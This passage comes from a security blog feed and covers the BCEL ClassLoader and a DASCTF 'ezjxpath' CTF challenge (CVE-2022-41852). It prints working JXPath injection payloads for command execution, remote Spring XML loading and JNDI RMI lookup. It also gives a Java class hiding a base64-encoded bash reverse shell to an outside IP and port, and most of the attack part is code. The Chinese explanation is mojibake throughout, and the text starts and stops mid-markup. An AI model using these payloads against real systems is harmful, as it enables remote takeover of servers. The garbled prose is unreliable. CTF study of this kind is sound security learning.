class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> MemoryShell.BCEL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.util.ClassLoader;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BCELDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">         <span class="type">JavaClass</span> <span class="variable">cls</span> <span class="operator">=</span> Repository.lookupClass(calc.class);</span><br><span class="line">         <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> Utility.encode(cls.getBytes(), <span class="literal">true</span>);</span><br><span class="line">         System.out.println(code);</span><br><span class="line"></span><br><span class="line">         <span class="keyword">new</span> <span class="title class_">ClassLoader</span>().loadClass(<span class="string">&quot;$$BCEL$$&quot;</span> + code).newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230425210508013.png" alt="image-20230425210508013"></p><p>è¿™æ ·å°±æˆåŠŸå¼¹å…¶è®¡ç®—å™¨äº†</p><p>è¿›å…¥loadClass(),é¦–å…ˆä¼šåˆ¤æ–­ç±»åæ˜¯å¦ä»¥$$$BCEL$$$å¼€å¤´ï¼Œä¹‹åè°ƒç”¨<code>createClass()</code>æ–¹æ³•æ‹¿åˆ°ä¸€ä¸ª<code>JavaClass</code>å¯¹è±¡æœ€ç»ˆé€šè¿‡<code>defineClass()</code>åŠ è½½å­—èŠ‚ç è¿˜åŸç±»ã€‚</p><p><strong>è¿™é‡ŒåŸå› å°±æ˜¯åˆšå¼€å§‹å¯¹loadClassçš„åˆ†æ</strong></p><p>é‚£ä¹ˆæˆ‘ä»¬å°±è¿›è¡Œæ–­ç‚¹è°ƒè¯•è·Ÿä¸€ä¸‹</p><p><img src="../images/image-20230425211759344.png" alt="image-20230425211759344"></p><p>è¿™é‡Œç”±äºæˆ‘ä»¬å‰é¢ç»™æ–‡ä»¶å¤´åŠ äº†ä¸ªBCElå­—èŠ‚ç ï¼Œäºæ˜¯è¿™é‡Œå°±å¯ä»¥è¿›å…¥createClass()</p><p><strong>createClassæºç </strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> JavaClass <span class="title function_">createClass</span><span class="params">(String class_name)</span> &#123;</span><br><span class="line">  <span class="type">int</span>    <span class="variable">index</span>     <span class="operator">=</span> class_name.indexOf(<span class="string">&quot;$$BCEL$$&quot;</span>);</span><br><span class="line">  <span class="type">String</span> <span class="variable">real_name</span> <span class="operator">=</span> class_name.substring(index + <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">JavaClass</span> <span class="variable">clazz</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="type">byte</span>[]      bytes  = Utility.decode(real_name, <span class="literal">true</span>);</span><br><span class="line">    <span class="type">ClassParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassParser</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes), <span class="string">&quot;foo&quot;</span>);</span><br><span class="line"></span><br><span class="line">    clazz = parser.parse();</span><br><span class="line">  &#125; <span class="keyword">catch</span>(Throwable e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Adapt the class name to the passed value</span></span><br><span class="line">  <span class="type">ConstantPool</span> <span class="variable">cp</span> <span class="operator">=</span> clazz.getConstantPool();</span><br><span class="line"></span><br><span class="line">  <span class="type">ConstantClass</span> <span class="variable">cl</span> <span class="operator">=</span> (ConstantClass)cp.getConstant(clazz.getClassNameIndex(),</span><br><span class="line">                                                   Constants.CONSTANT_Class);</span><br><span class="line">  <span class="type">ConstantUtf8</span> <span class="variable">name</span> <span class="operator">=</span> (ConstantUtf8)cp.getConstant(cl.getNameIndex(),</span><br><span class="line">                                                   Constants.CONSTANT_Utf8);</span><br><span class="line">  name.setBytes(class_name.replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>createClass()</code>ä¸­,é€šè¿‡<code>subString()</code>æˆªå–$$$BCEL$$$åçš„å­—ç¬¦ä¸²ï¼Œå¹¶è°ƒç”¨<code>Utility.decode</code>è¿›è¡Œç›¸åº”çš„è§£ç å¹¶æœ€ç»ˆè¿”å›æ”¹å­—èŠ‚ç çš„bytesæ•°ç»„(decodeæ–¹æ³•å‚æ•°uncompressç”¨æ¥æ ‡è¯†æ˜¯å¦ä¸ºzipæµï¼Œå½“ä¸ºtrueæ—¶èµ°zipæµè§£ç )ã€‚ä¹‹åç”Ÿæˆ<code>Parser</code>è§£æå™¨å¹¶è°ƒç”¨<code>parse()</code>æ–¹æ³•è¿›è¡Œè§£æï¼Œå¹¶ç”Ÿæˆ<code>JavaClass</code>å¯¹è±¡<br>createClassæºç å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> JavaClass <span class="title function_">createClass</span><span class="params">(String class_name)</span> &#123;</span><br><span class="line">    <span class="type">int</span>    <span class="variable">index</span>     <span class="operator">=</span> class_name.indexOf(<span class="string">&quot;$$BCEL$$&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">real_name</span> <span class="operator">=</span> class_name.substring(index + <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">JavaClass</span> <span class="variable">clazz</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="type">byte</span>[]      bytes  = Utility.decode(real_name, <span class="literal">true</span>);</span><br><span class="line">      <span class="type">ClassParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassParser</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes), <span class="string">&quot;foo&quot;</span>);</span><br><span class="line"></span><br><span class="line">      clazz = parser.parse();</span><br><span class="line">    &#125; <span class="keyword">catch</span>(Throwable e) &#123;</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Adapt the class name to the passed value</span></span><br><span class="line">    <span class="type">ConstantPool</span> <span class="variable">cp</span> <span class="operator">=</span> clazz.getConstantPool();</span><br><span class="line"></span><br><span class="line">    <span class="type">ConstantClass</span> <span class="variable">cl</span> <span class="operator">=</span> (ConstantClass)cp.getConstant(clazz.getClassNameIndex(),</span><br><span class="line">                                                     Constants.CONSTANT_Class);</span><br><span class="line">    <span class="type">ConstantUtf8</span> <span class="variable">name</span> <span class="operator">=</span> (ConstantUtf8)cp.getConstant(cl.getNameIndex(),</span><br><span class="line">                                                     Constants.CONSTANT_Utf8);</span><br><span class="line">    name.setBytes(class_name.replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230425212337403.png" alt="image-20230425212337403"></p><p>è¿™é‡Œå°±æ˜¯å‰é¢ä¸ºä»€ä¹ˆè¦è¿›è¡Œå­—èŠ‚ç ç¼–ç çš„åŸå› ï¼Œå› ä¸ºè¿™é‡Œä¼šè¿›è¡Œè§£ç </p><p><strong>Utility.decode()æºç </strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** Decode a string back to a byte array.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> bytes the byte array to convert</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> uncompress use gzip to uncompress the stream of bytes</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] decode(String s, <span class="type">boolean</span> uncompress) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">  <span class="type">char</span>[] chars = s.toCharArray();</span><br><span class="line"></span><br><span class="line">  <span class="type">CharArrayReader</span> <span class="variable">car</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CharArrayReader</span>(chars);</span><br><span class="line">  <span class="type">JavaReader</span>      <span class="variable">jr</span>  <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JavaReader</span>(car);</span><br><span class="line"></span><br><span class="line">  <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> ch;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span>((ch = jr.read()) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">    bos.write(ch);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  bos.close();</span><br><span class="line">  car.close();</span><br><span class="line">  jr.close();</span><br><span class="line"></span><br><span class="line">  <span class="type">byte</span>[] bytes = bos.toByteArray();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(uncompress) &#123;</span><br><span class="line">    <span class="type">GZIPInputStream</span> <span class="variable">gis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GZIPInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes));</span><br><span class="line"></span><br><span class="line">    <span class="type">byte</span>[] tmp   = <span class="keyword">new</span> <span class="title class_">byte</span>[bytes.length * <span class="number">3</span>]; <span class="comment">// Rough estimate</span></span><br><span class="line">    <span class="type">int</span>    <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span>    b;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>((b = gis.read()) &gt;= <span class="number">0</span>)</span><br><span class="line">      tmp[count++] = (<span class="type">byte</span>)b;</span><br><span class="line"></span><br><span class="line">    bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[count];</span><br><span class="line">    System.arraycopy(tmp, <span class="number">0</span>, bytes, <span class="number">0</span>, count);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> bytes;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¹‹åè·å–åˆ°äº†è¯¥<code>JavaClass</code>å¯¹è±¡çš„bytesæ•°ç»„å¹¶è°ƒç”¨javaåŸç”Ÿçš„<code>defineClass()</code>åŠ è½½</p><p><img src="../images/image-20230425213242406.png" alt="image-20230425213242406"></p><p>ä¹‹åå°±æ˜¯åœ¨<code>newInstance()</code>æ—¶åˆå§‹åŒ–è§¦å‘é™æ€ä»£ç å—æ‰§è¡Œ</p><p>ä¹‹åè°ƒç”¨<code>createClass()</code>æ–¹æ³•æ‹¿åˆ°ä¸€ä¸ª<code>JavaClass</code>å¯¹è±¡æœ€ç»ˆé€šè¿‡<code>defineClass()</code>åŠ è½½å­—èŠ‚ç è¿˜åŸç±»ã€‚</p><p><strong>è¿™é‡Œå°±æ˜¯ä¸ºä»€ä¹ˆè¦ç”¨javaclasså’Œutilityç¼–ç çš„åŸå› </strong></p><p><strong>ä¸Šé¢çš„å‚è€ƒæ–‡ç« é‡Œè¿˜æœ‰ä¸€äº›é¢˜ç›®æ˜¯åˆ©ç”¨BCElçš„ï¼Œå¯ä»¥å»å‚è€ƒå‚è€ƒä¸€ä¸‹</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/CoLo/p/15869871.html#about-bcel&quot;&gt;å‚è€ƒæ–‡ç« &lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/</summary>
      
    
    
    
    
    <category term="BCEL Java ClassLoader" scheme="https://ke1nys.github.io/tags/BCEL-Java-ClassLoader/"/>
    
  </entry>
  
  <entry>
    <title>DASCTF-WEB-å¤ç°</title>
    <link href="https://ke1nys.github.io/posts/8a205ef3.html"/>
    <id>https://ke1nys.github.io/posts/8a205ef3.html</id>
    <published>2023-04-24T12:25:09.000Z</published>
    <updated>2023-04-26T13:05:32.225Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ezjxpath"><a href="#ezjxpath" class="headerlink" title="ezjxpath"></a><strong>ezjxpath</strong></h2><p><strong>cve-2022-41852</strong></p><p>è¿™é‡Œçœ‹åˆ«çš„å¸ˆå‚…çš„åšå®¢å†™çš„æ˜¯<strong>TCTFä¸­çš„éé¢„æœŸè§£</strong></p><p>åˆšå¼€å§‹çš„æ—¶å€™,å‘ç°è¿™æ˜¯ä¸ªCVEæ¼æ´ï¼Œä½†æ˜¯googleèƒ½æœåˆ°çš„æ–¹æ³•ä»–å…¨ç»™banäº†ï¼Œæ‰€ä»¥è¿™ä¸ªå¾—è‡ªå·±å»æ‰¾åˆ©ç”¨é“¾å­æ¥æ‰“</p><p><img src="../images/image-20230424202815660.png" alt="image-20230424202815660"></p><p>è¿™é‡Œçš„è¯æ˜¯ç»™äº†ä¸€ä¸ªä¸çŸ¥é“å•¥ç©æ„çš„ä¸œè¥¿ï¼Œç„¶åæŠŠjaråŒ…ä¸‹è½½ä¸‹æ¥è¿›è¡ŒæŸ¥çœ‹</p><p><img src="../images/image-20230424203035639.png" alt="image-20230424203035639"></p><p>å°±æ˜¯è¿™é‡Œäº§ç”Ÿäº†æ¼æ´åˆ©ç”¨ç‚¹</p><p><strong>ç½‘ä¸Šèƒ½æŸ¥åˆ°çš„payload</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">JXPathContext</span> <span class="variable">context</span> <span class="operator">=</span> JXPathContext.newContext(<span class="literal">null</span>);</span><br><span class="line">        context.getValue(<span class="string">&quot;exec(java.lang.Runtime.getRuntime(), &#x27;calc&#x27;)&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">JXPathContext</span> <span class="variable">context</span> <span class="operator">=</span> JXPathContext.newContext(<span class="literal">null</span>);</span><br><span class="line">        context.getValue(<span class="string">&quot;org.springframework.context.support.ClassPathXmlApplicationContext.new(\&quot;http://127.0.0.1:9000/spring-Evil.xml\&quot;)&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">JXPathContext</span> <span class="variable">context</span> <span class="operator">=</span> JXPathContext.newContext(<span class="literal">null</span>);</span><br><span class="line">        context.getValue(<span class="string">&quot;javax.naming.InitialContext.doLookup(&#x27;rmi://127.0.0.1:1099/1u560y&#x27;)&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å°±æ˜¯è¿™å¸¸è§çš„ä¸‰ç§ï¼Œä½†æ˜¯éƒ½ç»™banæ‰äº†</p><p><img src="../images/image-20230424203330834.png" alt="image-20230424203330834"></p><p>äºæ˜¯æˆ‘ä»¬å°±å¾—è‡ªå·±å»å¯»æ‰¾é“¾å­æ¥æ‰“äº†</p><p>å¦‚æ­¤ä¸€æ¥æˆ‘ä»¬åªèƒ½å¦å¯»è¹Šè··äº†ï¼Œèµ›åå°±çªç„¶æƒ³åˆ°TCTFé‡Œçš„éé¢„æœŸè§£å¥½å¤šéƒ½æ˜¯é™æ€æ–¹æ³•ï¼Œè€Œè¿™é‡Œæˆ‘ä»¬ä¹Ÿæ˜¯ç”¨é™æ€æ–¹æ³•å»åˆ©ç”¨çš„<br><code>com.sun.org.apache.bcel.internal.util.JavaWrapper</code>ï¼Œè¿™ä¸ªç±»çš„<code>_main</code>æ–¹æ³•é€»è¾‘å¦‚ä¸‹</p><p>è¿™ä¸ªç±»åœ¨<code>rt.jar</code>åŒ…é‡Œï¼Œ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">_main</span><span class="params">(String[] argv)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">/* Expects class name as first argument, other arguments are by-passed.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span>(argv.length == <span class="number">0</span>) &#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;Missing class name.&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">class_name</span> <span class="operator">=</span> argv[<span class="number">0</span>];</span><br><span class="line">    String[] new_argv = <span class="keyword">new</span> <span class="title class_">String</span>[argv.length - <span class="number">1</span>];</span><br><span class="line">    System.arraycopy(argv, <span class="number">1</span>, new_argv, <span class="number">0</span>, new_argv.length);</span><br><span class="line"></span><br><span class="line">    <span class="type">JavaWrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JavaWrapper</span>();</span><br><span class="line">    wrapper.runMain(class_name, new_argv);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä¸»è¦é€»è¾‘åœ¨äºrunMainæ–¹æ³•é‡Œé¢ï¼Œclass_nameå’Œnew_argvå°±æ˜¯ç±»åå’Œå‚æ•°ï¼Œé€»è¾‘å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">runMain</span><span class="params">(String class_name, String[] argv)</span> <span class="keyword">throws</span> ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">Class</span>   <span class="variable">cl</span>    <span class="operator">=</span> loader.loadClass(class_name);</span><br><span class="line">  <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    method = cl.getMethod(<span class="string">&quot;_main&quot;</span>,  <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; argv.getClass() &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Method _main is sane ?</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">int</span>   <span class="variable">m</span> <span class="operator">=</span> method.getModifiers();</span><br><span class="line">    <span class="type">Class</span> <span class="variable">r</span> <span class="operator">=</span> method.getReturnType();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(Modifier.isPublic(m) &amp;&amp; Modifier.isStatic(m)) ||</span><br><span class="line">       Modifier.isAbstract(m) || (r != Void.TYPE))</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchMethodException</span>();</span><br><span class="line">  &#125; <span class="keyword">catch</span>(NoSuchMethodException no) &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;In class &quot;</span> + class_name +</span><br><span class="line">                       <span class="string">&quot;: public static void _main(String[] argv) is not defined&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    method.invoke(<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; argv &#125;);</span><br><span class="line">  &#125; <span class="keyword">catch</span>(Exception ex) &#123;</span><br><span class="line">    ex.printStackTrace();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>loader.loadClass(class_name);</code>å¤„æ˜¾ç„¶æ˜¯æœ‰ç±»åŠ è½½çš„ï¼Œè€Œè¿™ä¸ªloaderä»”ç»†ä¸€çœ‹ä¼šå‘ç°æ˜¯ä¸€ä¸ªBCEL</p><p><img src="../images/image-20230425195757268.png" alt="image-20230425195757268"></p><p>æ ¹æ®è¿™é“é¢˜åœ¨é‡æ–°æ¡ä¸€ä¸‹<strong>åŠ¨æ€ç±»åŠ è½½</strong>   è¿›è¡Œå¤ä¹ ä¸€ä¸‹</p><p>è¿™é‡Œçš„è¯è€ƒå¯Ÿçš„æ˜¯  <a href="https://www.cnblogs.com/CoLo/p/15869871.html#about-bcel">Javaå®‰å…¨ä¹‹BCEL ClassLoader</a></p><p>æ—¢ç„¶æœ‰è¿™ä¸ªä¸œè¥¿ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å†™ç¯‡æ–‡ç« æ¥å­¦ä¸€ä¸‹è¿™ä¸ª<code>BCEL ClassLoader</code></p><p>ç„¶åå¯¹äºä¸Šè¿°çš„JavaWrapperç±»ï¼Œæœ€åloadclassåä¼šå»è°ƒç”¨æ¶æ„ç±»çš„_mainæ–¹æ³•ï¼Œé‚£æˆ‘ä»¬åªéœ€è¦å¤åˆ»ä¸€ä¸‹æ¶æ„ç±»å°±å¥½äº†</p><p><strong>ä¸‹é¢çš„å°±æ˜¯æ¶æ„ç±»</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">calc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">_main</span><span class="params">(String[] argv)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTQuMTE2LjExOS4yNTMvNzc3NyAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230425224414705.png" alt="image-20230425224414705"></p><p><strong>éšä¹‹æŠŠä»–ç¼–è¯‘ä¸ºå­—èŠ‚ç </strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.util.ClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Hello world!</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">App</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span 